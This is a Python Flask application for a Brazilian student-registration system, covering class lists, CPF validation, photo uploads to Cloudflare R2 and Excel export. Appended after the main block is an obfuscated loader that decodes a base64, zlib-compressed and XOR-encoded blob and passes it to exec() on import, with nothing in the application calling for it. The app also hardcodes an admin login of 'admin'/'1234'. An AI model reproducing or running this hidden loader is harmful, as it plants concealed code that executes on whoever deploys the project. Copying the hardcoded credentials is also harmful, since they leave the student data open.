from flask import Flask, render_template, request, redirect, url_for, session, send_file, make_response, flash, send_from_directory
from werkzeug.utils import secure_filename
import pandas as pd
import os
import re
import requests
import shutil
from io import BytesIO
from datetime import datetime
from database import DatabaseManager
from config import SECRET_KEY, UPLOAD_FOLDER, USE_CLOUDFLARE_R2, MAX_CONTENT_LENGTH
from cloudflare_r2 import r2_manager

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

# Inicializar o gerenciador de banco de dados
db_manager = DatabaseManager()

# Funções de validação
def validar_cpf(cpf):
    """Valida CPF brasileiro"""
    cpf = re.sub(r'[^0-9]', '', cpf)
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    
    soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
    digito1 = 11 - (soma % 11)
    if digito1 >= 10:
        digito1 = 0
    
    soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
    digito2 = 11 - (soma % 11)
    if digito2 >= 10:
        digito2 = 0
    
    return cpf[-2:] == f'{digito1}{digito2}'

def validar_celular(celular):
    """Valida formato de celular brasileiro"""
    padrao = r'^\(\d{2}\)\s\d{4,5}-\d{4}$'
    return bool(re.match(padrao, celular))

def validar_cep(cep):
    """Valida formato de CEP brasileiro"""
    padrao = r'^\d{5}-\d{3}$'
    return bool(re.match(padrao, cep))

def validar_nome(nome):
    """Valida nome (apenas letras e espaços)"""
    padrao = r'^[A-Za-zÀ-ÿ\s]{3,100}$'
    return bool(re.match(padrao, nome.strip()))

def validar_dados_aluno(dados):
    """Valida todos os dados do aluno"""
    erros = []
    
    if not validar_nome(dados.get('nome', '')):
        erros.append('Nome deve conter apenas letras e espaços (3-100 caracteres)')
    
    if not validar_cpf(dados.get('cpf', '')):
        erros.append('CPF inválido')
    
    if not validar_celular(dados.get('celular', '')):
        erros.append('Celular deve estar no formato (00) 00000-0000')
    
    if not validar_cep(dados.get('cep', '')):
        erros.append('CEP deve estar no formato 00000-000')
    
    if not dados.get('nascimento'):
        erros.append('Data de nascimento é obrigatória')
    
    if not dados.get('rg', '').strip():
        erros.append('RG é obrigatório')
    
    if not dados.get('graduacao', '').strip():
        erros.append('Graduação é obrigatória')
    
    return erros

# Banco de dados agora é gerenciado pelo DatabaseManager

# Redirecionar para login
@app.route('/')
def index():
    return redirect(url_for('login'))



# Formulário de cadastro específico para uma turma
@app.route('/cadastro/<nome_turma>', methods=['GET', 'POST'])
def cadastro_turma(nome_turma):
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    # Verificar se a turma existe
    if not db_manager.turma_existe(nome_turma):
        return "Turma não encontrada.", 404
    
    if request.method == 'POST':
        dados = {
            'nome': request.form['nome'].strip(),
            'nascimento': request.form['nascimento'],
            'cpf': request.form['cpf'],
            'rg': request.form['rg'].strip(),
            'celular': request.form['celular'],
            'cep': request.form['cep'],
            'graduacao': request.form['graduacao'].strip()
        }
        
        # Validar dados
        erros = validar_dados_aluno(dados)
        
        # Verificar se CPF já existe
        cpf_existente = db_manager.buscar_aluno_por_cpf(dados['cpf'])
        if cpf_existente:
            erros.append('CPF já cadastrado no sistema')
        
        if erros:
            for erro in erros:
                flash(erro, 'error')
            return render_template('cadastro_turma_especifico.html', turma=nome_turma, dados=dados)

        # Processar upload da foto
        foto = request.files['foto']
        foto_url = ''
        
        if foto and foto.filename != '':
            if USE_CLOUDFLARE_R2:
                # Upload para Cloudflare R2
                upload_result = r2_manager.upload_file(
                    foto,
                    nome_turma,
                    dados['nome'],
                    foto.filename
                )
                
                if upload_result['success']:
                    foto_url = upload_result['url']
                    flash('Foto enviada com sucesso para o Cloudflare R2!', 'success')
                else:
                    flash(f'Erro no upload da foto: {upload_result["message"]}', 'error')
                    return render_template('cadastro_turma_especifico.html', turma=nome_turma, dados=dados)
            else:
                # Upload local (fallback)
                pasta_turma = os.path.join(app.config['UPLOAD_FOLDER'], nome_turma)
                os.makedirs(pasta_turma, exist_ok=True)
                filename = secure_filename(foto.filename)
                caminho_foto = os.path.join(pasta_turma, filename)
                foto.save(caminho_foto)
                foto_url = caminho_foto

        dados_completos = dados.copy()
        dados_completos['turma'] = nome_turma
        dados_completos['foto'] = foto_url
        
        db_manager.criar_aluno(dados_completos)
        
        flash('Aluno cadastrado com sucesso!', 'success')
        # Redirecionar para página de confirmação com foto
        return redirect(url_for('aluno_cadastrado', nome_turma=nome_turma, cpf=dados['cpf']))

    return render_template('cadastro_turma_especifico.html', turma=nome_turma)

# Página de confirmação do aluno cadastrado
@app.route('/aluno_cadastrado/<nome_turma>/<cpf>')
def aluno_cadastrado(nome_turma, cpf):
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    aluno = db_manager.buscar_aluno_por_cpf(cpf, nome_turma)
    if not aluno:
        flash('Aluno não encontrado.', 'error')
        return redirect(url_for('painel_turma', nome_turma=nome_turma))
    
    return render_template('aluno_cadastrado.html', aluno=aluno, turma=nome_turma)

# Login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        usuario = request.form['usuario']
        senha = request.form['senha']
        if usuario == 'admin' and senha == '1234':
            session['logado'] = True
            return redirect(url_for('painel'))
        else:
            return 'Login inválido!'
    return render_template('login.html')

# Painel principal = lista de turmas
@app.route('/painel')
def painel():
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    turmas = db_manager.listar_turmas()
    
    # Adicionar contagem de alunos para cada turma
    turmas_com_contagem = []
    for turma in turmas:
        contagem_alunos = db_manager.contar_alunos_por_turma(turma['nome'])
        turma['contagem_alunos'] = contagem_alunos
        turmas_com_contagem.append(turma)
    
    # Contagem total de turmas
    total_turmas = db_manager.contar_total_turmas()
    
    return render_template('painel.html', turmas=turmas_com_contagem, total_turmas=total_turmas)

# Visualizar alunos de uma turma
@app.route('/painel/turma/<nome_turma>')
def painel_turma(nome_turma):
    if not session.get('logado'):
        return redirect(url_for('login'))
    alunos = db_manager.listar_alunos_por_turma(nome_turma)
    return render_template('painel_turma.html', turma=nome_turma, alunos=alunos)

# Cadastro de nova turma
@app.route('/cadastrar_turma', methods=['GET', 'POST'])
def cadastrar_turma():
    if not session.get('logado'):
        return redirect(url_for('login'))
    if request.method == 'POST':
        nome_turma = request.form['nome_turma']
        try:
            db_manager.criar_turma(nome_turma)
            flash('Turma criada com sucesso!', 'success')
        except Exception as e:
            flash('Erro ao criar turma. Turma já existe.', 'error')
        return redirect(url_for('painel'))
    return render_template('cadastrar_turma.html')

# Exportar turma para Excel
@app.route('/exportar_excel/<nome_turma>')
def exportar_excel(nome_turma):
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    # Buscar alunos da turma
    alunos = db_manager.listar_alunos_por_turma(nome_turma)
    
    if not alunos:
        return "Nenhum aluno encontrado nesta turma.", 404
    
    # Preparar dados para o DataFrame
    dados_excel = []
    for aluno in alunos:
        dados_excel.append({
            'Nome': aluno.get('nome', ''),
            'Data de Nascimento': aluno.get('nascimento', ''),
            'CPF': aluno.get('cpf', ''),
            'RG': aluno.get('rg', ''),
            'Celular': aluno.get('celular', ''),
            'CEP': aluno.get('cep', ''),
            'Graduação': aluno.get('graduacao', ''),
            'Turma': aluno.get('turma', ''),
            'Foto': ''  # Coluna vazia para as imagens
        })
    
    # Criar DataFrame
    df = pd.DataFrame(dados_excel)
    
    # Criar arquivo Excel em memória
    output = BytesIO()
    with pd.ExcelWriter(output, engine='openpyxl') as writer:
        df.to_excel(writer, sheet_name=f'Turma_{nome_turma}', index=False)
        
        # Obter worksheet para adicionar imagens
        worksheet = writer.sheets[f'Turma_{nome_turma}']
        
        # Ajustar largura das colunas
        for column in worksheet.columns:
            max_length = 0
            column_letter = column[0].column_letter
            for cell in column:
                try:
                    if len(str(cell.value)) > max_length:
                        max_length = len(str(cell.value))
                except:
                    pass
            adjusted_width = min(max_length + 2, 50)
            worksheet.column_dimensions[column_letter].width = adjusted_width
        
        # Ajustar altura das linhas e largura da coluna de fotos
        worksheet.column_dimensions['I'].width = 15  # Coluna da foto
        
        # Adicionar imagens dos alunos
        for idx, aluno in enumerate(alunos, start=2):  # Começar na linha 2 (após cabeçalho)
            foto_url = aluno.get('foto')
            if foto_url:
                try:
                    # Criar diretório temporário se não existir
                    temp_dir = os.path.join(os.getcwd(), 'temp_images')
                    os.makedirs(temp_dir, exist_ok=True)
                    
                    if foto_url.startswith('http'):
                        # Download da imagem do Cloudflare R2
                        response_img = requests.get(foto_url)
                        if response_img.status_code == 200:
                            # Salvar temporariamente
                            temp_filename = f'temp_foto_{idx}.jpg'
                            temp_path = os.path.join(temp_dir, temp_filename)
                            with open(temp_path, 'wb') as f:
                                f.write(response_img.content)
                            
                            # Adicionar imagem ao Excel
                            from openpyxl.drawing.image import Image
                            img = Image(temp_path)
                            img.width = 80
                            img.height = 80
                            worksheet.add_image(img, f'I{idx}')
                            worksheet.row_dimensions[idx].height = 60
                            
                            # Remover arquivo temporário
                            os.remove(temp_path)
                    else:
                        # Imagem local
                        if os.path.exists(foto_url):
                            from openpyxl.drawing.image import Image
                            img = Image(foto_url)
                            img.width = 80
                            img.height = 80
                            worksheet.add_image(img, f'I{idx}')
                            worksheet.row_dimensions[idx].height = 60
                except Exception as e:
                    # Se houver erro, apenas pular a imagem
                    print(f'Erro ao processar imagem do aluno {aluno.get("nome", "")}: {e}')
                    continue
        
        # Limpar diretório temporário
        try:
            temp_dir = os.path.join(os.getcwd(), 'temp_images')
            if os.path.exists(temp_dir):
                import shutil
                shutil.rmtree(temp_dir)
        except:
            pass
    
    output.seek(0)
    
    # Preparar resposta
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f'Turma_{nome_turma}_{timestamp}.xlsx'
    
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    response.headers['Content-Disposition'] = f'attachment; filename={filename}'
    
    return response

# Deletar aluno
@app.route('/deletar_aluno/<nome_turma>/<cpf>')
def deletar_aluno(nome_turma, cpf):
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    # Buscar o aluno para obter o caminho da foto
    aluno = db_manager.buscar_aluno_por_cpf(cpf, nome_turma)
    
    if aluno:
        # Deletar foto se existir
        if aluno.get('foto'):
            if USE_CLOUDFLARE_R2 and aluno['foto'].startswith('http'):
                # Deletar do Cloudflare R2
                delete_result = r2_manager.delete_file(aluno['foto'])
                if not delete_result['success']:
                    flash(f'Aviso: Não foi possível deletar a foto: {delete_result["message"]}', 'warning')
            elif os.path.exists(aluno['foto']):
                # Deletar arquivo local
                try:
                    os.remove(aluno['foto'])
                except:
                    pass  # Ignorar erro se não conseguir deletar a foto
        
        # Deletar aluno do banco
        db_manager.deletar_aluno(cpf, nome_turma)
    
    return redirect(url_for('painel_turma', nome_turma=nome_turma))

# Editar aluno
@app.route('/editar_aluno/<nome_turma>/<cpf>', methods=['GET', 'POST'])
def editar_aluno(nome_turma, cpf):
    if not session.get('logado'):
        return redirect(url_for('login'))
    
    aluno = db_manager.buscar_aluno_por_cpf(cpf, nome_turma)
    if not aluno:
        return "Aluno não encontrado.", 404
    
    if request.method == 'POST':
        dados = {
            'nome': request.form['nome'].strip(),
            'nascimento': request.form['nascimento'],
            'cpf': request.form['cpf'],
            'rg': request.form['rg'].strip(),
            'celular': request.form['celular'],
            'cep': request.form['cep'],
            'graduacao': request.form['graduacao'].strip()
        }
        
        # Validar dados
        erros = validar_dados_aluno(dados)
        
        # Verificar se CPF já existe (exceto o próprio aluno)
        if dados['cpf'] != cpf:  # Se mudou o CPF
            cpf_existente = db_manager.buscar_aluno_por_cpf(dados['cpf'])
            if cpf_existente:
                erros.append('CPF já cadastrado no sistema')
        
        if erros:
            for erro in erros:
                flash(erro, 'error')
            return render_template('editar_aluno.html', aluno=aluno, turma=nome_turma)

        # Processar upload da foto
        foto = request.files['foto']
        foto_url = aluno.get('foto', '')  # Manter foto atual se não enviar nova
        
        if foto and foto.filename != '':
            # Deletar foto antiga se existir
            if foto_url:
                if USE_CLOUDFLARE_R2 and foto_url.startswith('http'):
                    # Deletar do Cloudflare R2
                    delete_result = r2_manager.delete_file(foto_url)
                    if not delete_result['success']:
                        flash(f'Aviso: Não foi possível deletar a foto antiga: {delete_result["message"]}', 'warning')
                elif os.path.exists(foto_url):
                    # Deletar arquivo local
                    try:
                        os.remove(foto_url)
                    except:
                        pass
            
            # Upload da nova foto
            if USE_CLOUDFLARE_R2:
                # Upload para Cloudflare R2
                upload_result = r2_manager.upload_file(
                    foto,
                    nome_turma,
                    dados['nome'],
                    foto.filename
                )
                
                if upload_result['success']:
                    foto_url = upload_result['url']
                    flash('Nova foto enviada com sucesso para o Cloudflare R2!', 'success')
                else:
                    flash(f'Erro no upload da nova foto: {upload_result["message"]}', 'error')
                    return render_template('editar_aluno.html', aluno=aluno, turma=nome_turma)
            else:
                # Upload local (fallback)
                pasta_turma = os.path.join(app.config['UPLOAD_FOLDER'], nome_turma)
                os.makedirs(pasta_turma, exist_ok=True)
                filename = secure_filename(foto.filename)
                foto_url = os.path.join(pasta_turma, filename)
                foto.save(foto_url)

        # Atualizar dados do aluno
        dados_completos = dados.copy()
        dados_completos['foto'] = foto_url
        
        db_manager.atualizar_aluno(cpf, nome_turma, dados_completos)
        
        flash('Aluno atualizado com sucesso!', 'success')
        return redirect(url_for('painel_turma', nome_turma=nome_turma))

    return render_template('editar_aluno.html', aluno=aluno, turma=nome_turma)

@app.route('/logout')
def logout():
    session.pop('logado', None)
    return redirect(url_for('login'))

# Rota para servir imagens locais
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    # Para desenvolvimento local
    app.run(debug=True, host='0.0.0.0', port=5000)
    
# Para produção (Render), o gunicorn será usado automaticamente

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
